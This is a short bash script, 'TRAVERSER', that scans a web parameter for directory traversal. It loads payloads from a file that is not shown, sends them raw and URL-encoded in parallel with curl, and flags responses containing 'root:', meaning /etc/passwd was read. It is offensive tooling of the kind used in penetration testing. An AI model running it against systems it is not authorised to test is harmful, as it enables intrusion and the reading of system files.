#!/bin/bash

# Fast Directory Traversal Scanner with Parallelism and URL-Encoded Payloads

echo         "TRAVERSER - Fast Directory Traversal Scanner"
echo          "Author: Aryan Pareek |"
echo         "Version: 1.0 | License: MIT"

TARGET="$1"
PAYLOADS_FILE="Directory_traversal.txt"
THREADS=10  # Max parallel jobs

if [ -z "$TARGET" ]; then
    echo "Usage: $0 <target_url_with_param>"
    echo "Example: $0 'http://example.com/view?file='"
    exit 1
fi

if [ ! -f "$PAYLOADS_FILE" ]; then
    echo "Payloads file '$PAYLOADS_FILE' not found!"
    exit 1
fi

# URL encode function
urlencode() {
    local string="$1"
    local length="${#string}"
    local encoded=""
    for (( i = 0; i < length; i++ )); do
        c="${string:i:1}"
        case $c in
            [a-zA-Z0-9.~_-]) encoded+="$c" ;;
            *) encoded+=$(printf '%%%02X' "'$c") ;;
        esac
    done
    echo "$encoded"
}

# Scan function for each payload
scan_payload() {
    payload="$1"
    enc_payload=$(urlencode "$payload")

    for current in "$payload" "$enc_payload"; do
        full_url="${TARGET}${current}"
        response=$(curl -s -w "\n%{http_code}" --max-time 5 "$full_url")
        body=$(echo "$response" | head -n -1)
        status=$(echo "$response" | tail -n1)

        if [ "$status" == "200" ]; then
            echo "[+] Payload: $current"
            echo "    Status Code: 200"
            
            if echo "$body" | grep -q "root:"; then
                echo "    [!!!] Possible Directory Traversal Detected!"
                echo "    [>>] $full_url"
            else
                echo "    [i] 200 OK — No obvious indicator, check manually."
            fi
            echo "--------------------------------------------"
        fi
    done
}

# Limit background threads
sem(){
    while [ "$(jobs -rp | wc -l)" -ge "$THREADS" ]; do sleep 0.1; done
}

# Run main loop
while IFS= read -r payload || [ -n "$payload" ]; do
    sem
    scan_payload "$payload" &
done < "$PAYLOADS_FILE"

wait
echo "[*] Scan complete."
